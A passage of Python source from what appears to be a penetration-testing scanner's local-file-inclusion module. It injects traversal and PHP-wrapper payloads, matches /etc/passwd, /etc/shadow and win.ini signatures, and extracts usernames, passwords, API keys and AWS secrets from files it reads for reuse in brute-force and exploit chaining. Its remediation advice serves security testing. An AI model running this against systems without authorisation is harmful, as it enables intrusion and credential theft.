                params[param_name] = [payload]
                query = urlencode(params, doseq=True)
                
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                
                if test_url in self.tested_payloads:
                    continue
                self.tested_payloads.add(test_url)
                
                try:
                    response = await client.get(test_url)
                    result = ResponseAnalyzer.analyze(response, payload, baseline)
                    
                    if result.vulnerable:
                        self._add_finding(
                            name=f"LFI via {encoding_type} Encoding",
                            description=f"Filter bypass using {encoding_type} encoding on parameter '{param_name}'.",
                            severity=Severity.HIGH,
                            host=base_url,
                            endpoint=test_url,
                            result=result,
                            param=param_name,
                        )
                        break
                        
                except Exception as e:
                    logger.debug(f"Encoding bypass test error: {e}")

    async def _test_php_legacy_lfi(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> None:
        """
        Test PHP legacy LFI payloads specifically for DVWA, bWAPP, Mutillidae.
        These are classic LFI patterns that work on older PHP apps.
        Added 2026-02-16 for improved legacy PHP coverage.
        """
        vulnerable_params = self._find_vulnerable_params(urls)

        # LFI detection signatures
        lfi_signatures = {
            "/etc/passwd": ["root:", "daemon:", "bin:", "/bin/bash", "/usr/sbin/nologin"],
            "/etc/shadow": ["root:$", "root:!", ":0:0:"],
            "/etc/hosts": ["localhost", "127.0.0.1"],
            "win.ini": ["[fonts]", "[extensions]", "[mci extensions]"],
            "boot.ini": ["boot loader", "[operating systems]", "multi(0)disk(0)"],
            "php://filter": ["PD9waHA", "PD8=", "<?php"],  # Base64 encoded PHP
            "/proc/self": ["HOSTNAME=", "PATH=", "HOME="],
        }

        for url, param_name, parsed in vulnerable_params[:15]:
            baseline = self.baseline_responses.get(url, "")
            param_findings_count = 0

            # PERF-FIX 2026-02-20: Try intelligent payload selection
            intelligent_payloads = await self._get_intelligent_payloads(
                category="lfi",
                endpoint=url,
                param_name=param_name,
                max_payloads=30,
                asset_data=getattr(self, '_asset_data', None),
            )
            if intelligent_payloads:
                # Use intelligent payloads first, then fallback to legacy payloads
                payloads_to_test = [p[0] for p in intelligent_payloads] + PayloadGenerator.PHP_LEGACY_LFI_PAYLOADS[:20]
            else:
                payloads_to_test = PayloadGenerator.PHP_LEGACY_LFI_PAYLOADS[:40]

            for payload in payloads_to_test:
                if param_findings_count >= self.max_findings_per_param:
                    break

                await rate_limiter.acquire()

                params = parse_qs(parsed.query)
                params[param_name] = [payload]
                query = urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

                if test_url in self.tested_payloads:
                    continue
                self.tested_payloads.add(test_url)

                try:
                    response = await client.get(test_url)
                    content = response.text

                    # Check for LFI signatures
                    found_signatures = []
                    for file_type, signatures in lfi_signatures.items():
                        for sig in signatures:
                            if sig in content and sig not in baseline:
                                found_signatures.append((file_type, sig))

                    if found_signatures:
                        # Determine severity based on what was found
                        severity = "HIGH"
                        lfi_type = LFIType.PATH_TRAVERSAL

                        if any("shadow" in f[0] for f in found_signatures):
                            severity = "CRITICAL"
                        elif any("php://filter" in payload for _ in found_signatures):
                            lfi_type = LFIType.PHP_WRAPPER
                            severity = "CRITICAL"  # Source disclosure is critical
                        elif any("/proc/" in payload for _ in found_signatures):
                            lfi_type = LFIType.PROC_SELF

                        result = LFIResult(
                            vulnerable=True,
                            lfi_type=lfi_type,
                            payload=payload,
                            evidence=[
                                f"Found signatures: {[f[1] for f in found_signatures[:3]]}",
                                f"File type indicators: {list(set(f[0] for f in found_signatures))}",
                                "PHP legacy LFI payload successful",
                            ],
                            confidence_score=90,
                            file_content=content[:200] if len(content) < 5000 else content[:200],
                        )

                        self._add_finding(
                            name=f"Local File Inclusion (PHP Legacy - {lfi_type.name})",
                            description=f"PHP legacy LFI vulnerability in parameter '{param_name}'. Payload: {payload[:50]}...",
                            severity=severity,
                            host=base_url,
                            endpoint=test_url,
                            result=result,
                            param=param_name,
                        )
                        param_findings_count += 1

                except Exception as e:
                    logger.debug(f"PHP legacy LFI test error: {e}")

    def _add_finding(
        self,
        name: str,
        description: str,
        severity: str,
        host: str,
        endpoint: str,
        result: LFIResult,
        param: str,
    ) -> None:
        """Add a finding to the results."""
        cvss_scores = {
            "CRITICAL": 9.8,
            "HIGH": 7.5,
            "MEDIUM": 5.5,
            "LOW": 3.5,
        }
        
        evidence = result.evidence + [
            f"Payload: {result.payload}",
            f"Confidence: {result.confidence}%",
            f"LFI Type: {result.lfi_type.name}",
        ]
        
        if result.target_os:
            evidence.append(f"Target OS: {result.target_os.value}")
        if result.wrapper_used:
            evidence.append(f"Wrapper: {result.wrapper_used.value}")
        if result.rce_possible:
            evidence.append("⚠️ RCE POSSIBLE")
        if result.source_disclosed:
            evidence.append("📄 Source code disclosed")
        if result.file_content:
            evidence.append(f"Content preview: {result.file_content[:100]}...")
        
        finding = Finding(
            vuln_type=VulnType.LFI,
                        category=VulnCategory.SERVER_SIDE if result.lfi_type != LFIType.RFI else "rfi",
            name=name,
            severity=severity,
            description=description,
            host=host,
            endpoint=endpoint,
            evidence=evidence,
            cvss_score=cvss_scores.get(severity, 7.5),
            cwe_id="CWE-22" if result.lfi_type != LFIType.RFI else "CWE-98",
            remediation=self._get_remediation(result),
            references=[
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://cwe.mitre.org/data/definitions/22.html",
                "https://portswigger.net/web-security/file-path-traversal",
            ],
        )
        
        self.findings.append(finding.to_dict())

        # THEME-4: Extract and share data for cross-module consumption
        # FIX 2026-02-16: Wrap in exception handler to prevent "Future exception was never retrieved"
        async def _safe_share():
            try:
                await self._share_extracted_data(result, endpoint)
            except Exception as e:
                logger.debug(f"[LFI] Failed to share extracted data: {e}")
        asyncio.create_task(_safe_share())

        logger.info(
            f"🚨 LFI Found [{severity}] - {name} | "
            f"Confidence: {result.confidence}% | Param: {param}"
        )
    
    def _get_remediation(self, result: LFIResult) -> str:
        """Get context-specific remediation advice."""
        base = (
            "1. Never use user input directly in file paths.\n"
            "2. Use allowlists for permitted files/directories.\n"
            "3. Use basename() to extract filename and validate.\n"
            "4. Implement proper input validation and sanitization.\n"
            "5. Use realpath() and verify the resolved path is within allowed directory.\n"
            "6. Configure open_basedir in PHP to restrict file access.\n"
        )
        
        if result.lfi_type == LFIType.RFI:
            base += (
                "\n\nRFI SPECIFIC:\n"
                "7. Disable allow_url_include in PHP.\n"
                "8. Disable allow_url_fopen if not needed.\n"
                "9. Use local file references only.\n"
            )
        
        if result.wrapper_used:
            base += (
                "\n\nPHP WRAPPER SPECIFIC:\n"
                "7. Disable dangerous wrappers in php.ini.\n"
                "8. Set allow_url_include=Off.\n"
                "9. Use stream_wrapper_unregister() for unused wrappers.\n"
            )
        
        if result.lfi_type == LFIType.LOG_POISONING:
            base += (
                "\n\nLOG POISONING SPECIFIC:\n"
                "7. Ensure log files are not accessible via web.\n"
                "8. Store logs outside web root.\n"
                "9. Sanitize user input in logs.\n"
            )
        
        return base

    # =========================================================================
    # THEME-4: Cross-module data sharing
    # =========================================================================

    async def _share_extracted_data(self, result: LFIResult, source_endpoint: str) -> None:
        """
        Extract and share data from LFI-read files for cross-module consumption.

        THEME-4 FIX: Enables feedback loops between modules:
        - /etc/passwd → Brute force with usernames
        - Config files → Credential extraction
        - .env files → Secret extraction
        """
        if not result.file_content:
            return

        try:
            from utils.shared_findings_store import SharedFindingsStore
            store = SharedFindingsStore.get_instance()
            content = result.file_content

            # Extract usernames from /etc/passwd
            if "passwd" in result.payload.lower() or ":x:" in content or ":/bin/" in content:
                usernames = self._extract_passwd_usernames(content)
                if usernames:
                    await store.add_extracted_data(
                        data_type="usernames",
                        values=usernames,
                        source_module="lfi_scanner",
                        source_endpoint=source_endpoint,
                        context={"file": "/etc/passwd", "os": "linux"},
                    )
                    logger.info(f"[THEME-4/LFI] Shared {len(usernames)} usernames from /etc/passwd")

            # Extract credentials from config files
            if any(kw in result.payload.lower() for kw in ["config", ".env", "wp-config", "settings"]):
                creds = self._extract_config_credentials(content)
                if creds:
                    await store.add_extracted_data(
                        data_type="credentials",
                        values=creds,
                        source_module="lfi_scanner",
                        source_endpoint=source_endpoint,
                        context={"file": result.payload, "extraction_method": "lfi_config_read"},
                    )
                    logger.info(f"[THEME-4/LFI] Shared {len(creds)} credentials from config file")

            # Register chain opportunities
            if result.source_disclosed or result.rce_possible:
                await store.add_extracted_data(
                    data_type="chain_opportunities",
                    values=[{
                        "chain_type": "lfi_to_rce" if result.rce_possible else "lfi_to_disclosure",
                        "description": f"LFI can read sensitive files - {'RCE possible' if result.rce_possible else 'source disclosed'}",
                        "payload": result.payload[:100],
                        "severity": "CRITICAL" if result.rce_possible else "HIGH",
                    }],
                    source_module="lfi_scanner",
                    source_endpoint=source_endpoint,
                    context={"suggested_modules": ["ssrf", "ssti", "cmdi"]},
                )

        except Exception as e:
            logger.debug(f"[THEME-4/LFI] Failed to share extracted data: {e}")

    def _extract_passwd_usernames(self, content: str) -> list[str]:
        """Extract usernames from /etc/passwd content."""
        usernames = []
        for line in content.split("\n"):
            if ":" in line and not line.startswith("#"):
                parts = line.split(":")
                if len(parts) >= 3:
                    username = parts[0].strip()
                    # Filter out system accounts with nologin/false shells
                    shell = parts[-1].strip() if len(parts) >= 7 else ""
                    if username and not any(x in shell for x in ["nologin", "false", "sync"]):
                        usernames.append(username)
        return usernames[:50]  # Limit to 50 usernames

    def _extract_config_credentials(self, content: str) -> list[dict]:
        """Extract credentials from config file content."""
        import re
        creds = []

        # Common patterns for credentials in config files
        patterns = [
            # DB connection strings
            (r"(?i)(?:db_)?password['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "password"),
            (r"(?i)(?:db_)?user(?:name)?['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "username"),
            # .env style
            (r"(?i)DATABASE_PASSWORD\s*=\s*['\"]?([^'\"\s]+)", "password"),
            (r"(?i)DATABASE_USER\s*=\s*['\"]?([^'\"\s]+)", "username"),
            (r"(?i)DB_PASSWORD\s*=\s*['\"]?([^'\"\s]+)", "password"),
            (r"(?i)DB_USER(?:NAME)?\s*=\s*['\"]?([^'\"\s]+)", "username"),
            # API keys and secrets
            (r"(?i)(?:api_)?secret(?:_key)?['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "secret"),
            (r"(?i)(?:api_)?key['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "api_key"),
            # AWS credentials
            (r"(?i)aws_secret_access_key\s*[=:]\s*['\"]?([^'\"\s]+)", "aws_secret"),
            (r"(?i)aws_access_key_id\s*[=:]\s*['\"]?([^'\"\s]+)", "aws_key"),
        ]

        extracted = {}
        for pattern, label in patterns:
            matches = re.findall(pattern, content)
            for match in matches[:5]:  # Limit per pattern
                if match and len(match) > 3:
                    if label not in extracted:
                        extracted[label] = []
                    extracted[label].append(match)

        # Build credential pairs
        if "username" in extracted and "password" in extracted:
            for i, username in enumerate(extracted["username"][:5]):
                password = extracted["password"][i] if i < len(extracted["password"]) else None
                if password:
                    creds.append({"username": username, "password_hash": password})

        # Add standalone secrets
        for key in ["secret", "api_key", "aws_secret", "aws_key"]:
            if key in extracted:
                for value in extracted[key][:3]:
                    creds.append({"type": key, "value": value})

        return creds


# Export version
__all__ = ["LFIScanner", "LFI_SCANNER_VERSION"]
